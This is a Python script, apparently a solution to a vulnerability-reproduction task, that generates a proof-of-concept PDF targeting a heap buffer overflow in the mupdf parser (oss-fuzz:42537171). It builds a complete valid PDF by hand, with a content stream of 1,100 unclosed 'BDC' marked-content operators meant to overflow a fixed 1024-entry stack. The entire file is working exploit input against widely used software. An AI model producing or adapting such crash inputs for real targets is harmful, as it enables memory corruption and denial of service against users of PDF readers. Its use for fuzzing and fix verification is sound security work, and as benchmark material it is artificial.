import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input that triggers a Heap Buffer Overflow
        in a PDF parser due to an unchecked nesting depth.

        The vulnerability, identified as oss-fuzz:42537171, occurs in mupdf.
        Specifically, the `fz_push_clip_stack` function does not check the stack
        depth before pushing a new element. This function is called when processing
        a 'BDC' (Begin Marked Content) operator. The corresponding stack
        (`gstate->clip_depth_stack`) has a fixed size of 1024.

        This PoC constructs a minimal, valid PDF file containing a content stream
        with more than 1024 nested 'BDC' operators without corresponding 'EMC'
        (End Marked Content) operators. This overflows the stack, triggering the
        vulnerability.
        """

        # The stack's capacity is 1024. We need more operations to overflow.
        # 1100 repetitions provide a safe margin.
        repetitions = 1100
        
        # A minimal valid 'BDC' operation sequence is '/T <<>> BDC '.
        # 'T' is a tag, and '<<>>' is an empty inline properties dictionary.
        payload = b'/T <<>> BDC ' * repetitions

        # We construct a valid PDF structure by hand, calculating byte offsets for
        # the cross-reference (xref) table.
        
        offsets = {}
        
        # PDF Header
        # Includes a binary comment to ensure it's treated as a binary file.
        header = b'%PDF-1.7\n%\xde\xad\xbe\xef\n'
        current_offset = len(header)

        # Object 1: Catalog
        offsets[1] = current_offset
        obj1 = b'1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n'
        current_offset += len(obj1)
        
        # Object 2: Pages Collection
        offsets[2] = current_offset
        obj2 = b'2 0 obj\n<</Type/Pages/Count 1/Kids[3 0 R]>>\nendobj\n'
        current_offset += len(obj2)
        
        # Object 3: Page Object
        offsets[3] = current_offset
        obj3 = b'3 0 obj\n<</Type/Page/Parent 2 0 R/MediaBox[0 0 10 10]/Contents 4 0 R>>\nendobj\n'
        current_offset += len(obj3)
        
        # Object 4: Content Stream containing the payload
        offsets[4] = current_offset
        obj4_parts = [
            f'4 0 obj\n<</Length {len(payload)}>>\nstream\n'.encode('ascii'),
            payload,
            b'\nendstream\nendobj\n'
        ]
        obj4 = b''.join(obj4_parts)
        current_offset += len(obj4)
        
        # Cross-Reference (xref) Table
        xref_offset = current_offset
        xref_parts = [b'xref\n0 5\n0000000000 65535 f \n']
        for i in range(1, 5):
            xref_parts.append(f'{offsets[i]:010d} 00000 n \n'.encode('ascii'))
        xref = b''.join(xref_parts)
        
        # PDF Trailer
        trailer = b'trailer\n<</Size 5/Root 1 0 R>>\n'
        
        # startxref and End-Of-File marker
        startxref = f'startxref\n{xref_offset}\n%%EOF'.encode('ascii')

        # Assemble the final PDF byte string
        return b''.join([
            header,
            obj1,
            obj2,
            obj3,
            obj4,
            xref,
            trailer,
            startxref
        ])
